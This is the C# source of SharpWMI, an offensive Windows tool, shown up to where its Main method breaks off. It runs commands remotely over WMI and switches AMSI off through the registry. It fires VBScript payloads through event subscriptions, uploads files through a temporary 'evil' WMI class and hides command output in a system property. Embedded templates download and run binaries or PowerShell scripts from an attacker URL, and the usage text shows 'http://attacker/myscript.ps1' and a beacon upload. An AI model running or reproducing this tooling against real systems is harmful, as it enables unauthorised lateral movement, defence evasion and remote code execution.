using System;
using System.CodeDom;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace SharpWMI
{
    class Program
    {
        private static string TemplateVBSCommand = @"
command = ""COMMAND""
computer = "".""

Set wmi = GetObject(""winmgmts:{impersonationLevel=impersonate}!\\"" _
        & computer & ""\root\cimv2"")

Set startup = wmi.Get(""Win32_ProcessStartup"")
Set conf = startup.SpawnInstance_
conf.ShowWindow = 12

Set proc = GetObject(""winmgmts:root\cimv2:Win32_Process"")
proc.Create command, Null, conf, intProcessID
";

        private static string TemplateVBSDownloadAndExec = @"
downloadURL = ""DOWNLOAD_URL""
saveAs = ""TARGET_FILE""
cmd = ""COMMAND""

Dim sh: Set sh = CreateObject(""WScript.Shell"")
out = sh.ExpandEnvironmentStrings(saveAs)

Dim xhr: Set xhr = CreateObject(""Msxml2.ServerXMLHTTP"")
xhr.Open ""GET"", downloadURL, False
xhr.Send

If xhr.Status = 200 Then
    With CreateObject(""Adodb.Stream"")
        .Open
        .Type = 1
        .write xhr.responseBody
        .savetofile out, 2
    End With

    If IsNull(cmd) Or Len(cmd) = 0  Then
        cmd = out
    End If
    sh.Run cmd, 0, False
End If

Set sh = Nothing
Set xhr = Nothing
";

        private static string TemplateVBSDownloadPSAndExec = @"
scriptURL = ""DOWNLOAD_URL""
launcher = ""powershell -nop -w hid -Command -""

Dim xhr: Set xhr = CreateObject(""MSXML2.XMLHTTP"")
xhr.Open ""GET"", scriptURL, False
xhr.Send

Function bin2a(Binary)
    Dim I, S
    For I = 1 to LenB(Binary)
        S = S & Chr(AscB(MidB(Binary, I, 1)))
    Next
    bin2a = S
End Function

If xhr.Status = 200 Then
    With CreateObject(""WScript.Shell"")
        With.Exec(launcher)
            .StdIn.WriteLine bin2a(xhr.responseBody)
            .StdIn.WriteBlankLines 1
            .Terminate
        End With
    End With
End If

Set xhr = Nothing
";

        //
        // Store WMI execution results in this class and it's property. The proper WMI class candidate
        // must typically exist across Windows versions and return ideally only one WMI instance object.
        //
        private static string ExecutionResultClassName = "Win32_OSRecoveryConfiguration";
        private static string ExecutionResultPropertyName = "DebugFilePath";

        //
        // During file upload we'll need to create a temporary evil WMI class having one property.
        // These variables specify properties of such WMI class to be created.
        //
        private static string FileUploadTempWMIClassName = "Win32_OSRecoveryConfigurationData";
        private static string FileUploadTempWMIPropertyName = "DebugOptions";



        static void Usage()
        {
            Console.WriteLine(@"
:: GhostPack/SharpWMI - a C# implementation of various WMI functionality.

This implementation is a refurbished and enhanced version of original SharpWMI by @harmj0y that adds some more 
flexibility for working with malicious VBS scripts, AMSI evasion, file upload purely via WMI and makes it possible  
to return output from WMI remotely executed commands.

AUTHORS:
  Original SharpWMI written:                    Will Schroeder @harmj0y (https://github.com/GhostPack/SharpWMI)
  WMI code-exec output idea:                    Evi1cg @Ridter
  AMSI evasion code taken from SharpMove:       Steven Flores 0xthirteen
  Enhancements, VBS flexibility, file upload:   Mariusz B. / mgeeky @mariuszbit

USAGE:
  Local system enumeration:        
    SharpWMI.exe action=query query=""select * from win32_service"" [namespace=BLAH]

  Remote system enumeration: 
    SharpWMI.exe action=query computername=HOST1[,HOST2,...] query=""select * from win32_service"" [namespace=BLAH]

  Remote process creation: 
    SharpWMI.exe action=exec computername=HOST[,HOST2,...] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]

  Remote VBS execution: 
    SharpWMI.exe action=executevbs computername=HOST[,HOST2,...] [script-specification] [eventname=blah] [amsi=disable] [time-specs]

  File upload via WMI:
    SharpWMI.exe action=upload computername=HOST[,HOST2,...] source=""C:\\source\\file.exe"" dest=""C:\\temp\\dest-file.exe"" [amsi=disable]

NOTE: 
  Any remote function also takes an optional ""username=DOMAIN\\user"" ""password=Password123!""

VBS Script execution:
  The 'executevbs' action was reworked as compared to the original version of SharpWMI. 
  Script specification defined in [script-specification] offers following methods to point this tool at target VBS code:

  A) Executes OS command via preset VBS code: 
    SharpWMI.exe action=executevbs [...] command=""notepad.exe"" 

  B) Downloads Powershell commands from URL and execute them from within VBS via Powershell's StdIn: 
    SharpWMI.exe action=executevbs [...] url=""http://attacker/myscript.ps1"" 

  C) Download a binary file from given URL, store it in specified path and then execute it: 
                                         url=""SOURCE_URL,TARGET_PATH""
    SharpWMI.exe action=executevbs [...] url=""http://attacker/foo.png,%TEMP%\bar.exe"" 

  D) Download a binary file from given URL, store it in specified path and then execute arbitrary command: 
                                         url=""SOURCE_URL,TARGET_PATH""
    SharpWMI.exe action=executevbs [...] url=""http://attacker/foo.png,%TEMP%\bar.exe"" command=""%TEMP%\bar.exe -some -parameters""

  E) Read VBS script from file and execute it: 
    SharpWMI.exe action=executevbs [...] script=""myscript.vbs"" 

  F) Execute given VBS script given literally:
    SharpWMI.exe action=executevbs [...] script=""CreateObject(\\""WScript.Shell\\"").Run(\\""notepad.exe\\"")"" 

  G) Base64 decode input string being encoded VBS script and execute it on remote machine: 
    SharpWMI.exe action=executevbs [...] scriptb64=""Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIi[...]"" 

  H) Read contents of given file, base64 decode them and then execute on target machine: 
    SharpWMI.exe action=executevbs [...] scriptb64=""myscript.vbs.b64"" 

  Finally, 'executevbs' action may have additional [time-specs] defined in seconds - they specify script trigger and wait timeouts:
    SharpWMI.exe action=executevbs [...] trigger=5 timeout=10


EXAMPLES:

  SharpWMI.exe action=query query =""select * from win32_process""

  SharpWMI.exe action=query query=""SELECT * FROM AntiVirusProduct"" namespace=""root\\SecurityCenter2""

  SharpWMI.exe action=query computername=primary.testlab.local query=""select * from win32_service""

  SharpWMI.exe action=query computername=primary,secondary query=""select * from win32_process""

  SharpWMI.exe action=exec computername=primary.testlab.local command=""powershell.exe -enc ZQBj...""

  SharpWMI.exe action=exec computername=primary.testlab.local command=""whoami"" result=true amsi=disable

  SharpWMI.exe action=executevbs computername=primary.testlab.local command=""notepad.exe"" eventname=""MyLittleEvent"" amsi=disable

  SharpWMI.exe action=executevbs computername=primary.testlab.local username=""TESTLAB\\harmj0y"" password=""Password123!""

  SharpWMI.exe action=upload computername=primary.testlab.local source=""beacon.exe"" dest=""C:\\Windows\\temp\\foo.exe"" amsi=disable
");
        }

        // helper used to wrap long output
        public static System.Collections.Generic.IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { throw new ArgumentNullException("singleLineString"); }

            if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }

        static void LocalWMIQuery(string wmiQuery, string wmiNameSpace = "")
        {
            ManagementObjectSearcher wmiData = null;

            try
            {
                if (String.IsNullOrEmpty(wmiNameSpace))
                {
                    wmiData = new ManagementObjectSearcher(wmiQuery);
                }
                else
                {
                    wmiData = new ManagementObjectSearcher(wmiNameSpace, wmiQuery);
                }

                ManagementObjectCollection data = wmiData.Get();
                Console.WriteLine();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        string propValue = String.Format("{0}", prop.Value);

                        // wrap long output to 80 lines
                        if (!String.IsNullOrEmpty(propValue) && (propValue.Length > 90))
                        {
                            bool header = false;
                            foreach (string line in Split(propValue, 80))
                            {
                                if (!header)
                                {
                                    Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, line));
                                }
                                else
                                {
                                    Console.WriteLine(String.Format("{0,30}   {1}", "", line));
                                }
                                header = true;
                            }
                        }
                        else
                        {
                            Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, prop.Value));
                        }
                    }
                    Console.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception {0}", ex.Message));
            }
        }

        static void RemoteWMIQuery(string host, string wmiQuery, string wmiNameSpace, string username, string password)
        {
            if (wmiNameSpace == "")
            {
                wmiNameSpace = "root\\cimv2";
            }

            ConnectionOptions options = new ConnectionOptions();

            Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);

            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("  User credentials: {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            try
            {
                scope.Connect();

                ObjectQuery query = new ObjectQuery(wmiQuery);
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();

                Console.WriteLine();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, prop.Value));
                    }
                    Console.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }
        static string GetWMIResultProperty(ManagementScope scope)
        {
            string wmiQuery = String.Format(@"SELECT {0} FROM {1}", ExecutionResultPropertyName, ExecutionResultClassName);
            try
            {
                ObjectQuery query = new ObjectQuery(wmiQuery);
                string WMIProperty = "";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();
                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        WMIProperty = prop.Value.ToString();
                    }

                }
                return WMIProperty;
            }
            catch (Exception ex)
            {
                return "";
            }
        }

        static void SetWMIResultProperty(ManagementScope scope, string newvalue)
        {
            ManagementClass configClass = new ManagementClass(scope, new ManagementPath(ExecutionResultClassName), null);
            ManagementObjectCollection MyCollection = configClass.GetInstances();

            try
            {
                foreach (ManagementObject MyObject in MyCollection)
                {
                    MyObject.SetPropertyValue(ExecutionResultPropertyName, newvalue);
                    MyObject.Put();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception in recovery: {0}", ex.Message);
            }
        }

        //
        // These two methods - SetRegKey and UnsetRegKey were written by Steven Flores (0xthirteen) in his SharpMove.
        // All credits goes to Steven.
        // Source: 
        //    https://github.com/0xthirteen/SharpMove/blob/master/SharpMove/SharpMove/Program.cs
        //

        static List<ManagementBaseObject> SetRegKey(ManagementScope scope)
        {
            List<ManagementBaseObject> originalstate = new List<ManagementBaseObject>();
            try
            {
                ManagementClass reg = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = reg.GetMethodParameters("EnumKey");
                inParams["hDefKey"] = 0x80000001;
                inParams["sSubKeyName"] = "Software\\Microsoft\\Windows Script";
                ManagementBaseObject outParams = reg.InvokeMethod("EnumKey", inParams, null);

                originalstate.Add(outParams);
                if (outParams.Properties["sNames"].Value == null)
                {
                    Console.WriteLine("[+] Value doesn't exist... Creating");
                    ManagementBaseObject in1 = reg.GetMethodParameters("CreateKey");
                    in1["hDefKey"] = 0x80000001;
                    in1["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    ManagementBaseObject out1 = reg.InvokeMethod("CreateKey", in1, null);
                    Console.WriteLine("[+] Created Windows Script key");

                    ManagementBaseObject in2 = reg.GetMethodParameters("SetDWORDValue");
                    in2["hDefKey"] = 0x80000001;
                    in2["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    in2["sValueName"] = "AmsiEnable";
                    in2["uValue"] = "0";
                    ManagementBaseObject out2 = reg.InvokeMethod("SetDWORDValue", in2, null);
                    Console.WriteLine("{+] Created AmsiEnable and set to : 0");
                    originalstate.Add(out2);
                }
                else
                {
                    ManagementBaseObject in1 = reg.GetMethodParameters("GetDWORDValue");
                    in1["hDefKey"] = 0x80000001;
                    in1["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    in1["sValueName"] = "AmsiEnable";
                    ManagementBaseObject outParams2 = reg.InvokeMethod("GetDWORDValue", in1, null);

                    originalstate.Add(outParams2);
                    if (outParams2.Properties["uValue"].Value != null)
                    {
                        string origval = outParams2.Properties["uValue"].Value.ToString();
                        Console.WriteLine("[+] Original AmsiEnable value : {0}", origval);

                        if (origval != "0")
                        {
                            ManagementBaseObject inParams3 = reg.GetMethodParameters("SetDWORDValue");
                            inParams3["hDefKey"] = 0x80000001;
                            inParams3["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                            inParams3["sValueName"] = "AmsiEnable";
                            inParams3["uValue"] = "0";
                            ManagementBaseObject outParams3 = reg.InvokeMethod("SetDWORDValue", inParams3, null);
                            Console.WriteLine("[+] AmsiEnable set to : 0");
                        }
                    }
                    else
                    {
                        ManagementBaseObject inParams4 = reg.GetMethodParameters("SetDWORDValue");
                        inParams4["hDefKey"] = 0x80000001;
                        inParams4["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                        inParams4["sValueName"] = "AmsiEnable";
                        inParams4["uValue"] = "0";
                        ManagementBaseObject outParams4 = reg.InvokeMethod("SetDWORDValue", inParams4, null);
                        Console.WriteLine("[+] Created AmsiEnable and set to : 0");
                    }
                }
                return originalstate;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception    : {0}", ex);
                return null;
            }
        }

        static void UnsetRegKey(ManagementScope scope, List<ManagementBaseObject> outParams)
        {
            try
            {
                ManagementClass reg1 = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                if (outParams[0].Properties["sNames"].Value != null) // Key did exist
                {
                    if (outParams[1].Properties["uValue"].Value != null)
                    {
                        string originalvalue = outParams[1].Properties["uValue"].Value.ToString();
                        if (originalvalue != "0")
                        {
                            ManagementBaseObject inParams3 = reg1.GetMethodParameters("SetDWORDValue");
                            inParams3["hDefKey"] = 0x80000001;
                            inParams3["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                            inParams3["sValueName"] = "AmsiEnable";
                            inParams3["uValue"] = originalvalue;
                            ManagementBaseObject outParams3 = reg1.InvokeMethod("SetDWORDValue", inParams3, null);
                            Console.WriteLine("[+] AmsiEnable set back to : {0}", originalvalue);
                        }
                        else if (originalvalue == "0")
                        {
                            Console.WriteLine("[+] AmsiEnable left at original value: {0}", originalvalue);
                        }
                    }
                    else
                    {
                        ManagementBaseObject inParams4 = reg1.GetMethodParameters("DeleteValue");
                        inParams4["hDefKey"] = 0x80000001;
                        inParams4["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                        inParams4["sValueName"] = "AmsiEnable";
                        ManagementBaseObject outParams4 = reg1.InvokeMethod("DeleteValue", inParams4, null);
                        Console.WriteLine("[+] Removed AmsiEnable Value");
                    }
                }
                else //Key did not exist
                {
                    ManagementBaseObject inParams3 = reg1.GetMethodParameters("DeleteValue");
                    inParams3["hDefKey"] = 0x80000001;
                    inParams3["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    inParams3["sValueName"] = "AmsiEnable";
                    ManagementBaseObject outParams3 = reg1.InvokeMethod("DeleteValue", inParams3, null);
                    Console.WriteLine("[+] AmsiEnable value removed");

                    ManagementBaseObject inParams2 = reg1.GetMethodParameters("DeleteKey");
                    inParams2["hDefKey"] = 0x80000001;
                    inParams2["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    ManagementBaseObject outParams2 = reg1.InvokeMethod("DeleteKey", inParams2, null);
                    Console.WriteLine("[+] Settings key removed");

                    ManagementBaseObject inParams4 = reg1.GetMethodParameters("DeleteKey");
                    inParams4["hDefKey"] = 0x80000001;
                    inParams4["sSubKeyName"] = "Software\\Microsoft\\Windows Script";
                    ManagementBaseObject outParams4 = reg1.InvokeMethod("DeleteKey", inParams4, null);
                    Console.WriteLine("[+] Windows Script key removed");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        static void RemoteWMIExecute(string host, string command, string username, string password, bool result, bool disableAmsi, bool quiet = false)
        {
            string wmiNameSpace = "root\\cimv2";
            bool alteredOriginalWMIProperty = false;
            string originalResultWMIPropertyValue = "";

            ConnectionOptions options = new ConnectionOptions();

            if(!quiet) Console.WriteLine("\r\n[*] Host                           : {0}", host);
            if (!quiet) Console.WriteLine("[*] Command                        : {0}", command);

            if (!String.IsNullOrEmpty(username))
            {
                if (!quiet) Console.WriteLine("[*] User credentials               : {0}", username);
                options.Username = username;
                options.Password = password;
            }

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            try
            {
                scope.Connect();

                List<ManagementBaseObject> originalAmsiKey = new List<ManagementBaseObject>();
                if (disableAmsi)
                {
                    originalAmsiKey = SetRegKey(scope);
                }

                // Store data in existing WMI property, but keep original value
                if (result)
                {
                    originalResultWMIPropertyValue = GetWMIResultProperty(scope);
                }

                var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());

                ManagementBaseObject inParams = wmiProcess.GetMethodParameters("Create");
                System.Management.PropertyDataCollection properties = inParams.Properties;

                var rnd = new Random();
                int randomXorKey = rnd.Next(1, 255);

                if (result)
                {
                    string tmpcmd = String.Format(
                        @"$o=({0} |Out-String).Trim();$e=(([Int[]][Char[]]$o)|%{{$_-bxor{1}}})-Join',';$a=Get-WmiObject -Class {2};$a.{3}=$e;$a.Put()",
                        command, randomXorKey, ExecutionResultClassName, ExecutionResultPropertyName);

                    tmpcmd = tmpcmd.Replace('\n', ' ').Replace('\r', ' ').Replace('\t', ' ').Replace("  ", " ");

                    inParams["CommandLine"] = "powershell -w hidden -nop -c \"" + tmpcmd + "\"";
                }
                else
                {
                    inParams["CommandLine"] = command;
                }

                ManagementBaseObject outParams = wmiProcess.InvokeMethod("Create", inParams, null);

                if (result) alteredOriginalWMIProperty = true;

                if (!quiet) Console.WriteLine("[*] Creation of process returned   : {0}", outParams["returnValue"]);
                if (!quiet) Console.WriteLine("[*] Process ID                     : {0}", outParams["processId"]);

                if (disableAmsi)
                {
                    UnsetRegKey(scope, originalAmsiKey);
                }

                if (result)
                {
                    int count = 0;
                    while (true)
                    {
                        string resultOfWmiExecution = GetWMIResultProperty(scope);
                        if (resultOfWmiExecution == originalResultWMIPropertyValue)
                        {
                            if (count < 3)
                            {
                                count++;
                                //Console.WriteLine("[*] Trying to get command's result...");
                                Thread.Sleep(3000);
                            }
                            else {
                                //Console.WriteLine("[-] Maybe command resulted with no output.");
                                break;
                            }
                        }
                        else
                        {
                            string[] tmp = resultOfWmiExecution.Split(',');
                            string cmdResult = "";

                            foreach (string i in tmp)
                            {
                                var n = (Convert.ToInt32(i)) ^ randomXorKey;
                                cmdResult += Convert.ToChar(n);
                            }

                            if (!quiet) Console.WriteLine("[+] Command result:\r\n\r\n");
                            Console.WriteLine(cmdResult + "\r\n");
                            break;
                        }
                    }

                    //Console.WriteLine("[*] Restoring WMI Property used for execution result...");
                    SetWMIResultProperty(scope, originalResultWMIPropertyValue);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));

                if (result && alteredOriginalWMIProperty)
                {
                    //Console.WriteLine("[*] Restoring WMI Property used for execution result...");
                    SetWMIResultProperty(scope, originalResultWMIPropertyValue);
                }
            }
        }

        static void RemoteWMIExecuteVBS(string host, string eventName, string username, string password, string payload, bool disableAmsi, int triggerTimerAfter, int scriptKillTimeout)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions();
                if (!String.IsNullOrEmpty(username))
                {
                    Console.WriteLine("[*] User credentials: {0}", username);
                    options.Username = username;
                    options.Password = password;
                }
                Console.WriteLine();

                ManagementScope timerScope = new ManagementScope(string.Format(@"\\{0}\root\cimv2", host), options);
                ManagementClass timerClass = new ManagementClass(timerScope, new ManagementPath("__IntervalTimerInstruction"), null);
                ManagementObject myTimer = timerClass.CreateInstance();

                myTimer["IntervalBetweenEvents"] = (UInt32)(triggerTimerAfter * 1000);
                myTimer["SkipIfPassed"] = false;
                myTimer["TimerId"] = "Timer";

                try
                {
                    Console.WriteLine("[*] Creating Event Subscription {0} : {1} - with interval between events: {2} secs",
                        eventName, host, triggerTimerAfter);
                    myTimer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in creating timer object: {0}", ex.Message);
                    return;
                }

                ManagementScope scope = new ManagementScope(string.Format(@"\\{0}\root\subscription", host), options);

                List<ManagementBaseObject> originalAmsiKey = new List<ManagementBaseObject>();
                if (disableAmsi)
                {
                    originalAmsiKey = SetRegKey(timerScope);
                }

                // then install the __EventFilter for the timer object
                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                WqlEventQuery myEventQuery = new WqlEventQuery(@"SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'");
                ManagementObject myEventFilter = wmiEventFilter.CreateInstance();

                myEventFilter["Name"] = eventName;
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";

                try
                {
                    Console.WriteLine("[*] Setting '{0}' event filter on {1}", eventName, host);
                    myEventFilter.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event filter: {0}", ex.Message);
                }

                // now create the ActiveScriptEventConsumer payload (VBS)
                ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();

                myEventConsumer["Name"] = eventName;
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = payload;
                myEventConsumer["KillTimeout"] = (UInt32)scriptKillTimeout;

                try
                {
                    Console.WriteLine("[*] Setting '{0}' event consumer on {1} to kill script after {2} secs", eventName, host, scriptKillTimeout);
                    myEventConsumer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event consumer: {0}", ex.Message);
                }

                // finally bind them together with a __FilterToConsumerBinding
                ManagementObject myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();

                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;

                try
                {
                    Console.WriteLine("[*] Binding '{0}' event filter and consumer on {1}", eventName, host);
                    myBinder.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting FilterToConsumerBinding: {0}", ex.Message);
                }

                // wait for everything to trigger
                Console.WriteLine("\r\n[*] Waiting {0} seconds for event to trigger on {1} ...\r\n", triggerTimerAfter, host);
                System.Threading.Thread.Sleep((triggerTimerAfter) * 1000);

                if (disableAmsi)
                {
                    UnsetRegKey(timerScope, originalAmsiKey);
                }

                // finally, cleanup
                try
                {
                    Console.WriteLine("[*] Removing 'Timer' internal timer from {0}", host);
                    myTimer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing 'Timer' interval timer: {0}", ex.Message);
                }

                try
                {
                    Console.WriteLine("[*] Removing FilterToConsumerBinding from {0}", host);
                    myBinder.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing FilterToConsumerBinding: {0}", ex.Message);
                }

                try
                {
                    Console.WriteLine("[*] Removing '{0}' event filter from {1}", eventName, host);
                    myEventFilter.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event filter: {0}", ex.Message);
                }

                try
                {
                    Console.WriteLine("[*] Removing '{0}' event consumer from {1}\r\n", eventName, host);
                    myEventConsumer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event consumer: {0}", ex.Message);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception {0}", ex.Message));
            }
        }

        public static void UploadFileViaWMI(string host, string username, string password, byte[] fileData, string destPath, bool disableAmsi)
        {
            string wmiNameSpace = "root\\cimv2";
            string className = FileUploadTempWMIClassName;
            string evilPropertyName = FileUploadTempWMIPropertyName;

            ConnectionOptions options = new ConnectionOptions();

            Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);

            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("  User credentials: {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();

            StringBuilder encodedFileData = new StringBuilder();
            for (int i = 0; i < fileData.Length; i++)
            {
                encodedFileData.Append(fileData[i].ToString());
                if (i != (fileData.Length - 1)) encodedFileData.Append(",");
            }

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            try
            {
                scope.Connect();

                // We're creating a static WMI class here
                ManagementObject evilClass = new ManagementClass(scope, null, null);
                evilClass["__CLASS"] = className;
                evilClass.Properties.Add(evilPropertyName, CimType.String, false);
                evilClass.Properties[evilPropertyName].Value = encodedFileData.ToString();

                try
                {
                    Console.WriteLine("[*] Uploading file via evil WMI static class' property: {0} ...", evilPropertyName);
                    evilClass.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception during setting evil property with file contents: {0}", ex.Message);
                    return;
                }

                string command = String.Format(@"powershell -w hidden -nop -c ""$e=([WmiClass]'{0}:{1}').Properties['{2}'].Value;[IO.File]::WriteAllBytes('{3}',[Byte[]][Int[]]($e-split','))""",
                    wmiNameSpace, evilClass, evilPropertyName, destPath);

                // Issuing remote WMI command to let the target fetch bytes from evil WMI class and store them into file.
                Console.WriteLine("[*] Pulling contents from WMI repository to disk on a remote machine...");
                RemoteWMIExecute(host, command, username, password, false, disableAmsi, true);

                int count = 0;
                bool success = false;

                // Now we're confirming the upload
                string wmiQuery = String.Format(@"SELECT * FROM CIM_DataFile WHERE Name = ""{0}""", destPath.Replace("\\", "\\\\"));
                ObjectQuery query = new ObjectQuery(wmiQuery);
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);

                Console.WriteLine("[*] Confirming whether file was uploaded...");
                while (count < 5)
                {
                    System.Threading.Thread.Sleep(2000);

                    ManagementObjectCollection data = searcher.Get();

                    foreach (ManagementObject result in data)
                    {
                        System.Management.PropertyDataCollection props = result.Properties;
                        foreach (System.Management.PropertyData prop in props)
                        {
                            if (prop.Name.ToLower() == "name" && ((string)prop.Value).ToLower() == destPath.ToLower())
                            {
                                success = true;
                                break;
                            }
                        }

                        if (success) break;
                    }

                    if (success) break;
                }

                // cleanup
                try
                {
                    Console.WriteLine("[*] Removing evil WMI class {0}", evilClass);
                    evilClass.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing evil WMI class: {0}", ex.Message);
                }

                if (success)
                {
                    Console.WriteLine("\r\n[+] SUCCESS: File uploaded: {0}", Path.GetFileName(destPath));
                }
                else
                {
                    Console.WriteLine("\r\n[-] FAILURE: Could not confirm whether file was uploaded: {0}", Path.GetFileName(destPath));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        public static byte[] GetFileContents(string filePath)
        {
            return File.ReadAllBytes(filePath);
        }

        public static string Base64Decode(string input)
        {
            byte[] data = System.Convert.FromBase64String(input);
            string output = System.Text.ASCIIEncoding.ASCII.GetString(data);

            return output;
        }

        static string GetVBSPayload(Dictionary<string, string> arguments)
        {
            string payload = "";

            foreach (KeyValuePair<string, string> entry in arguments)
            {
                if(entry.Key == "command" && !arguments.ContainsKey("url"))
                {
                    Console.WriteLine("[*] Used template VBScript for command execution.");
                    payload = TemplateVBSCommand.Replace("COMMAND", entry.Value);
                    break;
                }
                else if (entry.Key == "scriptb64")
                {
                    if(File.Exists(entry.Value))
                    {
                        payload = Base64Decode(File.ReadAllText(entry.Value));
                        Console.WriteLine(String.Format("[*] Read {0} bytes from {1} file with base64 encoded VBScript payload.", payload.Length, entry.Value));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[*] Using direct script's parameter as base64 encoded VBScript payload.");
                        payload = Base64Decode(entry.Value);
                    }
                    break;
                }
                else if (entry.Key == "script")
                {
                    if (File.Exists(entry.Value))
                    {
                        payload = File.ReadAllText(entry.Value);
                        Console.WriteLine(String.Format("[*] Read {0} bytes from {1} file with VBScript payload.", payload.Length, entry.Value));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[*] Using direct script's parameter as VBScript payload.");
                        payload = entry.Value;
                    }
                    break;
                }
                else if (entry.Key == "url")
                {
                    if (entry.Value.Contains(","))
                    {
                        string[] foo = entry.Value.Split(',');
                        if (foo.Length != 2 || foo[1].Trim().Length < 1)
                        {
                            Console.WriteLine("[!] Error: URL must be in form: url=URL,TargetFile");
                            System.Environment.Exit(1);
                        }

                        Console.WriteLine("[*] Using VBScript that downloads a binary file from URL to DST and executes it.");
                        payload = TemplateVBSDownloadAndExec.Replace("DOWNLOAD_URL", foo[0].Trim());
                        payload = payload.Replace("TARGET_FILE", foo[1].Trim());

                        Console.WriteLine("[*] Will download from   : " + foo[0].Trim());
                        Console.WriteLine("[*] And store the file at: " + foo[1].Trim());
                    }
                    else
                    {
                        Console.WriteLine("[*] Using VBScript that downloads a script and executes it using Powershell via StdIn.");
                        payload = TemplateVBSDownloadPSAndExec.Replace("DOWNLOAD_URL", entry.Value);
                    }

                    if (arguments.ContainsKey("command"))
                    {
                        payload = payload.Replace("COMMAND", arguments["command"]);
                        Console.WriteLine("[*] Will issue command   : " + arguments["command"]);
                    }
                    else
                    {
                        payload = payload.Replace("COMMAND", "");
                    }

                    break;
                }
            }

            return payload;
        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Usage();
                return;
            }

